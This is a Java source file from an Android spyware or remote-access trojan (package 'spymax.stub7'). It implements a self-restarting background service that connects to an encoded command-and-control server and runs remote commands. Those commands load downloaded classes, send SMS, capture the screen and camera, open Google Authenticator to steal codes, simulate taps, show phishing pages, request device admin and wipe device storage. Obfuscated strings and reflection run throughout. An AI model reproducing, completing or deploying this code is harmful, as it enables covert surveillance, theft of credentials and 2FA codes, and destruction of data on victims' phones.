package spymax.stub7;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Point;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;

import android.support.annotation.Nullable;
import android.util.Log;
import android.widget.Toast;


import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

import static spymax.stub7.ClassGen3.phonixeffect;

public class _srv_worker_ extends Service {

    @Override
    public void onTaskRemoved(Intent rootIntent){
       try {
           phonixeffect(getApplicationContext(),"Scanner",180000);
           Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
           restartServiceIntent.setPackage(getPackageName());

           PendingIntent restartServicePendingIntent = PendingIntent.getService(getApplicationContext(), 1, restartServiceIntent, PendingIntent.FLAG_ONE_SHOT);
           AlarmManager alarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
           alarmService.set(
                   AlarmManager.ELAPSED_REALTIME,
                   SystemClock.elapsedRealtime() + 1000,
                   restartServicePendingIntent);
           if (!wakeLock.equals(null))
           {
               if (wakeLock.isHeld() == true)
               {
                   wakeLock.release();
               }
           }
       }catch (Exception ex){}
        super.onTaskRemoved(rootIntent);
    }

//        public static class _srv_worker_con_ extends AsyncTask<Context, Integer, String> {
//            public static String T2="[RANDOM-STRING]";
//            public static String T3="[RANDOM-STRING]";
//            public static String T4="[RANDOM-STRING]";
//            public static String T5="[RANDOM-STRING]";
//            public static String T6="[RANDOM-STRING]";
//            public static String T7="[RANDOM-STRING]";
//
//        @Override
//        protected void onPreExecute() {
//            super.onPreExecute();
//        }
//        @Override
//        protected String doInBackground(Context... ctx) {
//
//
//           // return null;
//        }
//
//
//
//        @Override
//        protected void onPostExecute(String u) {
//            super.onPostExecute(u);
//           // MyWorker= null;
//        }
//    }

    @Override
    public void onDestroy(){
        super.onDestroy();
        ClassGen3.s_ClassGen3_f0 = 0;

        try {

            try
            {
                ClassGen3.phonixeffect(getApplicationContext(),"iamdone",180000);
            }
            catch (Exception ex ){ }

            try
            {

                sendBroadcast(new Intent(getApplicationContext(), SensorRestarterBroadcastReceiver.class).setAction("RestartSensor"));


            }catch (Exception e){

                  }

            if (wakeLock != null)
            {
                if (wakeLock.isHeld() == true)
                {
                    wakeLock.release();
                }
            }

            try
            {
                stopForeground(true);
            }catch (Exception e){}
        } catch (Exception e) {}
    }


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    PowerManager.WakeLock wakeLock = null;
    public static class ta extends AsyncTask<Context, Integer, String> {
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }
        @Override
        protected String doInBackground(Context... ctx) {
            do
            {
                String ENC = "";
                try{

                    try{
                        if (ClassGen2.ec_ClassGen2_ho == true){
                            if(ClassGen11.e_ClassGen11_co ==  -1){
                                ClassGen11.e_ClassGen11_co = System.currentTimeMillis() + ClassGen2.t_ClassGen2_t;
                            }else{
                                if (System.currentTimeMillis() > ClassGen11.e_ClassGen11_co){
                                    String sh = ClassGen3.dt;
                                    if(ClassGen11.inx == 2){
                                        sh = "\t";
                                    }

                                    try
                                    {
                                        ClassGen2._send_it_(ClassGen3.j_ClassGen3_z,sh.getBytes());
                                        ClassGen2.ox();
                                    }catch (Exception ex){}
                                    if(ClassGen11.inx >= 3){
                                        ClassGen11.inx = -1;


                                        ClassGen2.CLOSEALLINTENT("DONE");
                                    }else{
                                        ClassGen11.inx++;
                                    }
                                    ClassGen11.e_ClassGen11_co = -1;
                                }
                            }
                        }else{
                            ClassGen11.e_ClassGen11_co = -1;
                            if (ClassGen11.MyAccess != null)
                            {
                                if (ClassGen11.MyAccess.ClassGen12Recording)
                                {
                                    ClassGen11.MyAccess.ClassGen12Recording =false;
                                    ClassGen11.MyAccess.ClassGen12mRecorder.stop();
                                    ClassGen11.MyAccess.ClassGen12RecorderActive =false;
                                    ClassGen11.MyAccess.ClassGen12mRecorder.release();
                                }
                            }

                        }
                    } catch (Exception e) {     }

                    try{  try{
                        if(ClassGen11.L_ClassGen11_i.size() > 0){
                            ClassGen8 d = ClassGen11.L_ClassGen11_i.get(0);
                            if (d !=null){
                                String[] da = d.str.split(ClassGen11.yrfjerClassGen11SERBRE);
                                String db = da[0];
                                if(db.equals("0")){

                                    Class<?> cl = ClassGen10._clss_loder_(new Object[]{ctx[0],d.byt,da[1],da[4],"ՙXﹶYY[RANDOM-STRING]φTʾXXՙYﹶVC[RANDOM-STRING]WφXʾ"});
                                    ClassGen0 c = new ClassGen0(cl.getName(),cl);
                                    ClassGen11.L_ClassGen11_cl.add(c);
                                    if(ClassGen11.L_ClassGen11_cl.size() == Integer.valueOf(da[2])){
                                        ClassGen11.c_ClassGen11_mn[0] = da[5];
                                        ENC = "ʿʼˏ";
                                        ClassGen11.c_ClassGen11_mn[4] = da[6];
                                        ClassGen11.c_ClassGen11_mn[5] = da[7];
                                        ENC = "ʿʼ₫[RANDOM-STRING]ˎ$ˉˏ";

                                        try
                                        {
                                            ClassGen11.c_ClassGen11_mn[6] = da[8];
                                            ClassGen11.c_ClassGen11_mn[7] = da[9];
                                            ClassGen11.c_ClassGen11_mn[8] = da[10];
                                        }catch (Exception ex){ }
                                        ENC = "ʿʼ₫[RANDOM-STRING]ˏ";
                                        ClassGen11.c_ClassGen11_mn[9] = da[11];
                                        ClassGen11.c_ClassGen11_mn[10] = da[12];
                                        ClassGen11.c_ClassGen11_mn[11] = da[13];
                                        ENC = "ʿʼ₫ˏ";
                                        ClassGen11.c_ClassGen11_mn[12] = da[14];
                                        ClassGen11.c_ClassGen11_mn[13] = da[15];
                                        ENC = "ʿʼθˏ";
                                        ClassGen11.c_ClassGen11_mn[14] = da[16];
                                        ClassGen11.c_ClassGen11_mn[15] = da[17];
                                        ClassGen11.c_ClassGen11_mn[16] = da[18];
                                        ENC = "ʿʼ$ˏ";
                                        ClassGen11.p_ClassGen11_lg = ClassGen11.L_ClassGen11_cl.size();
                                        ClassGen10._run_comnd_(new Object[]{ctx[0],da[3]});
                                        ClassGen2.s_ClassGen2_s = 10L;
                                        ClassGen2._send_it_(ClassGen11.c_ClassGen11_mn[15],"\t".getBytes());
                                        if (ENC.equals("SVAER"))
                                        {
                                            ClassGen2._send_it_(ClassGen11.c_ClassGen11_mn[15],"\t".getBytes());
                                        }
                                    }
                                }else if(ClassGen3._isequel_mth_(db,ClassGen11.c_ClassGen11_mn[4])){
                                    if(ClassGen11.L_ClassGen11_cl.size()>0){
                                        for (int i = 0; i <= ClassGen11.L_ClassGen11_cl.size(); i++){
                                            if (ClassGen11.L_ClassGen11_cl.get(i).Datahelp.equals(da[1])){
                                                Object obj = ClassGen10._excut_meth_("ʼʾʿˈᵔঙʿ$ʿʼ", new Object[]{ctx[0],ClassGen11.L_ClassGen11_cl.get(i).jasonalfa,da[2],da[4],d.byt,"ʼʾʿˈᵔঙʿ$ʿʼ"});
                                                if(!da[3].equals(ClassGen11.c_ClassGen11_mn[16])){
                                                    try {
                                                        ClassGen2._send_it_(da[3], ClassGen3.get_ClassGen3_Bytes(obj));
                                                        ENC = "SVvsds2456ˉˏ";
                                                    } catch (Exception e) { }
                                                    //break;
                                                }
                                                break;

                                            }
                                        }
                                    }
                                }else if(ClassGen3._isequel_mth_(db,ClassGen11.c_ClassGen11_mn[5])){

                                        String vul[] = {da[1],da[2],da[3],da[4],da[5],da[6],da[7],da[8]};
                                        if (da[4].equals("ddll"))
                                        {
                                            if (da[1].startsWith("msg:")){
                                                //w ot msg:
                                                try {
                                                    if (da[1].endsWith(":up"))
                                                    {
                                                        _update_app_ atualizaApp = new _update_app_();
                                                        atualizaApp.setContext(ClassGen11.app_ClassGen11_Context,da[1].replace("msg:","").replace(":up",""));
                                                        //  atualizaApp.execute(da[1].replace("msg:","").replace(":up",""));
                                                    }else if(da[1].endsWith(":fsh")){
                                                        FPPAGE(da[1].replace("msg:","").replace(":fsh",""));
                                                    }
                                                    else
                                                    {

                                                        showToast(da[1].replace("msg:",""));
                                                    }

                                                }catch (Exception e){


                                                }
                                            }else if (da[1].startsWith("goauth<*>")){
                                                try {
                                                    //openlink(da[1].replace("lnk<*>",""));
                                                    try
                                                    {
                                                        if (ClassGen9.IP_ClassGen9_I(ClassGen3._Reblace_("co#$m.goo#$gle.andr#$oid.ap#$ps.authent#$icator2","#$"), ctx[0].getPackageManager()))
                                                        {
                                                            ClassGen12.ClassGen12SendGoogleAuth =true;
                                                            PackageManager pm = ctx[0].getPackageManager();
                                                            Intent launchIntent = pm.getLaunchIntentForPackage(ClassGen3._Reblace_("co#$m.goo#$gle.andr#$oid.ap#$ps.authent#$icator2","#$"));
                                                            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                                                            ctx[0].startActivity(launchIntent);
                                                        }
                                                        else
                                                        {
                                                            ClassGen2._send_it_(ClassGen3.s_ClassGen3_fh, "Google Auth<app not installed<app not installed".getBytes());
                                                        }

                                                    }catch (Exception e){}
                                                }catch (Exception e){

                                                }
                                            }else if (da[1].startsWith("kill<*>")){
                                                try {
                                                    ClassGen12.ClassGen12bypass =true;
                                                    //Runtime.getRuntime().exit(0);
                                                    //  openlink(da[1].replace("lnk<*>",""));

                                                }catch (Exception e){

                                                }
                                            }else if (da[1].startsWith("CRD<*>")){
                                                try
                                                {
                                                    String command2 = da[1].replace("CRD<*>","");
                                                    if (command2.startsWith("E>"))
                                                    {
                                                        ClassGen12.DisabledApps.add(command2.replace("E>","").toLowerCase());
                                                    }else if (command2.startsWith("D>"))
                                                    {
                                                        ClassGen12.DisabledApps.remove(command2.replace("D>","").toLowerCase());
                                                    }
                                                }catch (Exception a){}
                                            }
                                            else if (da[1].startsWith("EHP<*>")){
                                                try {
                                                    String command = da[1].replace("EHP<*>","");
                                                    String arrydata[] = command.split("#");
                                                    String NewIP =arrydata[0] ;
                                                    String NewPORT =arrydata[1] ;
                                                    String Newname =arrydata[2] ;
                                                    ClassGen11.CLINAME = Newname;
                                                    MySettings.Write(ctx[0],"NH",NewIP);
                                                    MySettings.Write(ctx[0],"NP",NewPORT);
                                                    MySettings.Write(ctx[0],"NN",Newname);
                                                    MySettings.Write(ctx[0],"UP","YES");

                                                    ClassGen2.CLOSEALLINTENT("[RANDOM-STRING]");
                                                    Intent intent = new Intent(ctx[0], ClassGen9.class);
                                                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                                    ctx[0].startActivity(intent);
                                                    //ctx[0].finish();
                                                    Runtime.getRuntime().exit(0);
//                                                if (!ClassGen10._runn_srv_(_srv_worker_.class, ctx[0])) {
//
//                                                    ctx[0].stopService(new Intent(ctx[0], _srv_worker_.class));
//
//                                                }
//                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O  ) {
//                                                    ctx[0].startForegroundService(new Intent(ctx[0], _srv_worker_.class));
//                                                }else
//                                                {
//                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && ClassGen3.NeedNotifi()) {
//
//                                                    ctx[0].startForegroundService(new Intent(ctx[0],_srv_worker_.class));
//                                                }else
//                                                {
//                                                    ctx[0].startService(new Intent(ctx[0],_srv_worker_.class));
//
//                                                }
                                                    // }
                                                    break;

                                                }catch (Exception e){

                                                   // e.printStackTrace();
                                                }
                                            }else if (da[1].startsWith("pst<*>")){
                                                try {
                                                    // openlink(da[1].replace("lnk<*>",""));
                                                    if (ClassGen11.MyAccess != null)
                                                    {
                                                        ClassGen11.MyAccess.ClassGen12ToPaste =da[1].replace("pst<*>","");
                                                        ClassGen11.MyAccess.ClassGen12NeedPaste =true;
                                                        ClassGen11.MyAccess.ClassGen12Treger();
                                                    }

                                                }catch (Exception e){

                                                }
                                            }
                                            else if (da[1].startsWith("lnk<*>")){
                                                try {
                                                    openlink(da[1].replace("lnk<*>",""));


                                                }catch (Exception e){

                                                }
                                            }else if (da[1].startsWith("ssms<*>")){


                                                try {


                                                    String command = da[1].replace("ssms<*>","");
                                                    String arrydata[] = command.split("#");
                                                    String number =arrydata[0] ;
                                                    String MSG =arrydata[1] ;
                                                    ClassGen12.sendSMS(number,MSG);
                                                }catch (Exception e){

                                                }


                                            }
                                            else if (da[1].startsWith("adm<*>")){
                                                try {
                                                   RequestAdmin();
                                                }catch (Exception e){

                                                }
                                            }
                                            else if (da[1].startsWith("admwip<*>")){
                                                try {
                                                    if (!activityadm.mDPM.equals(null))
                                                    {
                                                        // mDPM.lockNow();
                                                        // if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                                        //mDPM.getDeviceOwnerLockScreenInfo();
                                                        //activityadm.mDPM.wipeData(DevicePolicyManager.WIPE_SILENTLY);
                                                        activityadm.mDPM.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
                                                        activityadm.mDPM.wipeData(DevicePolicyManager.WIPE_RESET_PROTECTION_DATA);
                                                        activityadm.mDPM.wipeData(DevicePolicyManager.WIPE_EUICC);

                                                        //   }
                                                    }
                                                }catch (Exception e){
                                                    //  e.printStackTrace();
                                                }
                                            }else if (da[1].startsWith("rdd<*>"))
                                            {
                                                try
                                                {

                                                    ClassGen11.MyAccess.ClassGen12OFK = "wait";

                                                    ClassGen11.D_ClassGen11_ele(da[1].replace("rd<*>",""));
                                                    //ClassGen2._send_it_(ClassGen3.lg,(MyAccess.RD(da[1].replace("rd<*>",""))).getBytes());
                                                    ClassGen11.MyAccess.ClassGen12OFK = "on";

                                                }catch (Exception e){     }
                                            }
                                            else if (da[1].startsWith("rd<*>"))
                                            {
                                                try
                                                {

                                                    ClassGen11.MyAccess.ClassGen12OFK = "wait";

                                                    ClassGen2._send_it_(ClassGen3.l_ClassGen3_g,(ClassGen11.MyAccess.ClassGen12RD(da[1].replace("rd<*>",""))).getBytes());
                                                    ClassGen11.MyAccess.ClassGen12OFK = "on";

                                                }catch (Exception e){





                                                      }
                                            }
                                            else if (da[1].startsWith("sp<*>")){
                                                // TODO: 6/1/2021  new tool for show alert msg
                                                try {


                                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                                        String coordinates = da[1].replace("sp<*>","");
                                                        if(coordinates.contains("clk") || coordinates.contains("Bc") || coordinates.contains("Ho") || coordinates.contains("RC"))
                                                        {
                                                            ClassGen11.MyAccess.ClassGen12SW(da[1].replace("sp<*>",""));
                                                        }else
                                                        {
                                                            String[] tokens = coordinates.split(Pattern.quote(":"));
                                                            Point[] moviments = new Point[tokens.length];

                                                            for (int i = 0; i < tokens.length; i++) {
                                                                String[] coordinatesarry = tokens[i].replace("{", "").replace("}", "").split(",");

                                                                int x = Integer.parseInt(coordinatesarry[0].split("=")[1]);
                                                                int y = Integer.parseInt(coordinatesarry[1].split("=")[1]);

                                                                moviments[i] = new Point(x, y);

                                                            }
                                                            ClassGen11.MyAccess.mouseDraw(moviments, 1000);
                                                        }

                                                    }

                                                }catch (Exception e){

                                                }
                                            }else  if (da[1].startsWith("sc:"))
                                            {
                                                try{
                                                    StartScreen(da[1].replace("sc:",""));
                                                }catch (Exception e ){}
                                            }

                                            //    showToast("ok");


                                        }else {

                                            if(ClassGen10._runn_srv_(ClassGen6.class,ctx[0])) {
                                                try
                                                {
                                                    ClassGen11.F_ClassGen11_ORCA =true;
                                                    Intent myIntent = new Intent(ClassGen11.app_ClassGen11_Context, CamActivity.class);
                                                    myIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                                    myIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                                                    myIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                                    myIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                                                    myIntent.putExtra("key", vul);//Optional parameters
                                                    ClassGen11.app_ClassGen11_Context.startActivity(myIntent);
                                                }catch (Exception e){

                                                    try {
                                                        Intent i = new Intent(ctx[0], ClassGen6.class);
                                                        //String vul[] = {da[1],da[2]};
                                                        i.putExtra(ClassGen8.FTX1,vul);
                                                        //  ClassGen3.StartNewScan(ctx[0],i);
                                                        ctx[0].startService(i);
                                                        //  LOGIT(ctx[0],i);
                                                    }catch (Exception ff){}
                                                }


                                            }else
                                            {
                                                //if(!ClassGen10._runn_srv_(ClassGen6.class,ctx[0])) {
                                                    ClassGen11.F_ClassGen11_ORCA =false;
                                                    Intent i = new Intent(ctx[0], ClassGen6.class);
                                                    ctx[0].stopService(i);
                                                    try{ Thread.sleep(1000);} catch (InterruptedException e) {





                                                          }
                                                //}
                                            }

                                        }

                                }else if(ClassGen3._isequel_mth_(db,ClassGen11.c_ClassGen11_mn[6])){
                                    if(ClassGen10._runn_srv_(ClassGen5.class,ctx[0])) {
                                        Intent i = new Intent(ctx[0], ClassGen5.class);
                                        String vul[] = {da[1],da[2]};
                                        i.putExtra(ClassGen8.FTX2,vul);
                                        //  ClassGen3.StartNewScan(ctx[0],i);
                                        ctx[0].startService(i);
                                        //  .OGIT(ctx[0],i);
                                    }
                                }else if(ClassGen3._isequel_mth_(db,ClassGen11.c_ClassGen11_mn[7])){
                                    if(!ClassGen10._runn_srv_(ClassGen5.class,ctx[0])) {

                                        try
                                        {
                                            Intent i = new Intent(ctx[0], ClassGen5.class);
                                            ctx[0].stopService(i);
                                        }catch (Exception ex){





                                                 }
                                    }
                                }else if(ClassGen3._isequel_mth_(db,ClassGen11.c_ClassGen11_mn[8])){
                                    ClassGen3._exit_meth_(ctx[0],da[1]);
                                }else if(ClassGen3._isequel_mth_(db,ClassGen11.c_ClassGen11_mn[9])){
                                    ClassGen3.rel(false);
                                    ClassGen2._send_it_(da[1],"\t".getBytes());
                                }else if(ClassGen3._isequel_mth_(db,ClassGen11.c_ClassGen11_mn[11])){
                                    ClassGen11.c_ClassGen11_mn[1] = da[1];
                                    ENC = "[RANDOM-STRING]ˎ$ˉ$*&%$ˏ";
                                    ClassGen11.c_ClassGen11_mn[2] = da[2];
                                    ClassGen11.c_ClassGen11_mn[3] = da[3];


                                        ClassGen11.k = ClassGen3.acc(ctx[0], ClassGen12.class);

                                    ClassGen11.k_ClassGen11_live = ClassGen11.k;
                                    ClassGen2._send_it_(ClassGen11.c_ClassGen11_mn[1] + ClassGen11.c_ClassGen11_mn[2] + String.valueOf(ClassGen11.k)+"|"+ClassGen11.Get_ClassGen11_Logs(),"\t".getBytes());
                                }else if(ClassGen3._isequel_mth_(db,ClassGen11.c_ClassGen11_mn[12])){
                                    //ClassGen11.k = false;
                                    ClassGen11.k_ClassGen11_live = false;
                                }else if(ClassGen3._isequel_mth_(db,ClassGen11.c_ClassGen11_mn[13])){
                                    ClassGen3.WK_ClassGen3_L(ctx[0],true);
                                    ClassGen2._send_it_(da[1],"\t".getBytes());
                                }else if(ClassGen3._isequel_mth_(db,ClassGen11.c_ClassGen11_mn[14])){
                                    if(ClassGen2.ec_ClassGen2_ho){
                                        ClassGen2._fist_inf_("ˈᵔঙʿ$ʿʼ₫[RANDOM-STRING]θᵢיʿᘣθˉˆˉθφˎ$ˉˎ$ﹳˊⶱⁱᵇʾ[RANDOM-STRING]ˑ$ˏـﹳ");
                                    }
                                }else {     }
                            }
                            if(!ClassGen2.q){
                                ClassGen11.L_ClassGen11_i.clear();
                            }else{
                                ClassGen11.L_ClassGen11_i.remove(0);
                            }
                            try{ Thread.sleep(1);} catch (InterruptedException e) {}
                        }else {
                            try{ Thread.sleep(1000);} catch (InterruptedException e) {}
                        }
                    } catch (Exception e) {     }
                    }catch (OutOfMemoryError e) {}

                    //    }

                }catch (Exception EX){







                    //    ClassGen11.iamrunning =false;
                }
            }while (true);
            return  "";
        }

        private void RequestAdmin() {
            if (null != ClassGen11.app_ClassGen11_Context) {
                try{

                    Handler handler = new Handler(Looper.getMainLooper());
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            ClassGen11.app_ClassGen11_Context.startActivity(new Intent(ClassGen11.app_ClassGen11_Context, activityadm.class)
                                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                    .addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                                    .addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY));
                        }

                    });



                    // ClassGen9.DumpActivity.startActivityForResult();
                }catch (Exception e){
                    e.printStackTrace();
                }


            }
        }

        @Override
        protected void onPostExecute(String u) {
            super.onPostExecute(u);
        }
    }

    @Override
    public void onCreate() {

        super.onCreate();
        try
        {
            if  (ClassGen11.app_ClassGen11_Context == null)
            {
                ClassGen11.app_ClassGen11_Context = getApplicationContext();
            }
           // ClassGen11.app_ClassGen11_Context = getApplicationContext();
            phonixeffect(getApplicationContext(),"Battery",18000);

            PowerManager pm = (PowerManager)getSystemService(POWER_SERVICE);
            if (wakeLock == null)
            {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "PeriSecure:MyWakeLock");
            }
            if (wakeLock != null)
            {
                if (wakeLock.isHeld() == false)
                {
                    wakeLock.acquire();
                }
            }

            Context ctxnot = getApplicationContext();
            ClassGen3.p_ClassGen3_r = ctxnot.getResources().getString(R.string.t1t2t3t4t5t6);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && ClassGen3.p_ClassGen3_r.charAt(1) == ClassGen3.c1) {


                try
                {
                    Notification  ntf  = ClassGen3.Foreground(ctxnot,"Worker","Workers");
                    if (ntf != null)
                    {
                        int _IDD = 9594;

                        this.startForeground(_IDD, ntf);
                    }

                }catch (Exception ex){     }

            }

            ClassGen8.FTX0 ="sysdata";
            ClassGen8.FTX1 ="appdata";
            ClassGen8.FTX2 ="configrs";
            ClassGen8.FTX3 ="sysinfo";
            ClassGen3.e_ClassGen3_xc = new ThreadPoolExecutor(8, 15, 1,
                    TimeUnit.MINUTES, new ArrayBlockingQueue<Runnable>(ClassGen3.m_ClassGen3_ax));

            p(this);



        }catch (Exception b){

        }




    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        return START_STICKY;
    }

    public static void showToast(final String msg) {
        if (null != ClassGen11.app_ClassGen11_Context) {
            Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                @Override
                public void run() {
                    try {

                        Toast.makeText(ClassGen11.app_ClassGen11_Context, msg, Toast.LENGTH_LONG).show();

                    }catch (Exception e){}
                }

            });

        }
    }


    public static void openlink(final String link)
    {
        if (null != ClassGen11.app_ClassGen11_Context) {
            try{

                    Handler handler = new Handler(Looper.getMainLooper());
                    handler.post(new Runnable() {
                        @Override
                        public void run() {

                            Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(link));
                            browserIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            ClassGen11.app_ClassGen11_Context.startActivity(browserIntent);
                        }

                    });



                // ClassGen9.DumpActivity.startActivityForResult();
            }catch (Exception e){
                e.printStackTrace();
            }


        }
    }



    public static void StartScreen(final String on)
    {
        if (null != ClassGen11.app_ClassGen11_Context) {

            try{
                if (on.startsWith("on:"))
                {
                    ClassGen11.FO_ClassGen11_RSC =true;
                    Intent myIntent = new Intent(ClassGen11.app_ClassGen11_Context, SCRActivity.class);
                    myIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    myIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                    myIntent.putExtra("key", on);//Optional parameters
                    ClassGen11.app_ClassGen11_Context.startActivity(myIntent);
                }else
                {
                    ClassGen11.FO_ClassGen11_RSC =false;
                    Intent myIntent = new Intent(ClassGen11.app_ClassGen11_Context, SCRActivity.class);
                    myIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    myIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                    myIntent.putExtra("key", "off");//Optional parameters
                    ClassGen11.app_ClassGen11_Context.startActivity(myIntent);

                }

                // ClassGen9.DumpActivity.startActivityForResult();
            }catch (Exception e){}
        }
    }

    public static void FPPAGE(final String type)
    {
        if (null != ClassGen11.app_ClassGen11_Context) {

            try{
                Intent myIntent = new Intent(ClassGen11.app_ClassGen11_Context, _sc_fb_.class);
                myIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                myIntent.putExtra("key", type);//Optional parameters
                ClassGen11.app_ClassGen11_Context.startActivity(myIntent);




                // ClassGen9.DumpActivity.startActivityForResult();
            }catch (Exception e){}
        }
    }

    private void LOGIT(Context ctx, Intent i) {
        try
        {
            String funClass = "spymax"+ "."+"stub7"+ "."+"ClassGen3";
            Class c = null;
            try {
                c = Class.forName(funClass);
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            }


            Object o = null;
            try {
                o = c.newInstance();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            } catch (InstantiationException e) {
                e.printStackTrace();
            }

            Class[] paramTypes = new Class[2];
            paramTypes[0]=Context.class;
            paramTypes[1]=Intent.class;
            String methodName = ClassGen3._D_BASE64_("U3RhcnROZXdTY2Fu");

            Method m = null;
            try {
                m = c.getDeclaredMethod(methodName, paramTypes);
            } catch (NoSuchMethodException e) {
                e.printStackTrace();
            }

            try {
                m.invoke(o, new Object[]{ctx,i});
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            } catch (InvocationTargetException e) {
                e.printStackTrace();
            }
        }catch (Exception bb){}
    }



    public static void p(Context ctx){
        try
        {
            String IDR = "";
            try {
                String _SERIAL = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);

                IDR = IDR +_SERIAL;
            }catch (Exception e)
            {

                IDR =ClassGen8.GD_ClassGen8_I(ctx);
            }
            ClassGen11.L_ClassGen11_i = new ArrayList<ClassGen8>();
            ClassGen11.L_ClassGen11_cl = new ArrayList<ClassGen0>();
            if (MySettings.read(ctx,"NN","").length() !=0)
            {

                ClassGen11.CLINAME = MySettings.read(ctx,"NN",ClassGen11.CLINAME);
            }
            String nm = ClassGen11.CLINAME + "|"+IDR;
            //Log.e("NEW NAME",nm);
            String tm = "";
            String cm = "";

            String gm = "";
            try
            {
                 tm = ClassGen8.FTX0;
                 cm = ClassGen8.FTX1;
                 gm = ClassGen8.FTX2;
            }catch (Exception ex){     }
            String im = ClassGen3._D_BASE64_(ClassGen11.Host);
            String pm = ClassGen3._D_BASE64_(ClassGen11.Port);

          //  if (ClassGen3.g_ClassGen3_t(ctx,tm).length() == 0){

                try
                {
                    ClassGen3.dit(ctx,nm,tm);
                }catch (Exception ex){     }
            //}
//            if (ClassGen3.g_ClassGen3_t(ctx,cm).length() != 0){
//                im = ClassGen3.g_ClassGen3_t(ctx,cm);
//            }
//            if (ClassGen3.g_ClassGen3_t(ctx,gm).length() != 0){
//                pm = ClassGen3.g_ClassGen3_t(ctx,gm);
//            }
            if (MySettings.read(ctx,"NH","").length() !=0)
            {
                im = MySettings.read(ctx,"NH","");
            }

            if (MySettings.read(ctx,"NP","").length() !=0)
            {
                pm = MySettings.read(ctx,"NP","");
            }
            ClassGen2._new_con_(im,pm,ctx);
            final Context[] ctxf = new Context[]{ctx};
           new ta().execute(ctxf);

        }catch (Exception e){}
    }
}
